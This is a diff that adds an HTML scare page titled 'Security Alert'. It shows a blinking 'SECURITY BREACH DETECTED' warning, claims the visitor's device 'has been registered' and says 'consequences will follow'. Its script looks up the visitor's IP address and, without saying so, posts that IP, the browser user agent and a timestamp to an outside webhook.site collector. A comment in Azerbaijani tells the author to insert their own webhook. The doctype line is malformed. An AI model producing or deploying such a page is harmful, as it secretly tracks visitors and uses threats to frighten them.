@@ -1,0 +1,53 @@
+<!#80FF00DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Alert</title>
+    <style>
+        body {
+            background-color: black;
+            color: red;
+            font-family: 'Courier New', Courier, monospace;
+            text-align: center;
+            padding-top: 100px;
+        }
+        .hacker-text {
+            font-size: 20px;
+            animation: blink 1s infinite alternate;
+        }
+        @keyframes blink {
+            from { opacity: 1; }
+            to { opacity: 0; }
+        }
+    </style>
+</head>
+<body>
+    <h1>⚠️ SECURITY BREACH DETECTED ⚠️</h1>
+    <p class="hacker-text">Your IP Address: <span id="ip-address">Tracking...</span></p>
+    <p class="hacker-text">Your device has been registered. Do not close this page.</p>
+    <p class="hacker-text">If you do not comply, consequences will follow.</p>
+
+    <script>
+        fetch('https://api64.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                document.getElementById('ip-address').textContent = data.ip;
+
+                // Webhook.site URL-ni bura əlavə et
+                fetch('https://webhook.site/d0bd5d4e-c93b-461d-a724-d9362aea846e', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        ip: data.ip,
+                        userAgent: navigator.userAgent,
+                        time: new Date().toISOString()
+                    })
+                });
+            })
+            .catch(() => {
+                document.getElementById('ip-address').textContent = 'ERROR RETRIEVING IP';
+            });
+    </script>
+</body>
+</html>
